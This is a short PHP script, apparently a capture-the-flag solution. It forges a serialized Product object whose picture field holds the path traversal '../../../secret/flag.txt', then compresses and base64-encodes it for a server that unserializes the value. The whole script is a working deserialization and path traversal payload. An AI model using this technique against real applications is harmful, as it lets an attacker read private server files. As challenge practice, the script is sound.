<?php

class Product {

	private $id;
	private $name;
	private $description;
	private $picture;
	private $price;

	function __construct($id, $name, $description, $picture, $price) {
		$this->id = $id;
		$this->name = $name;
		$this->description = $description;
		$this->picture = $picture;
		$this->price = $price;
	}
}

# as a picture of the product we put our desired file
$modified_product = new Product(99, "nice_product", "nice_product", "../../../secret/flag.txt", 99);

# basically reversing the proces the server does
echo base64_encode(gzcompress(serialize($modified_product)));
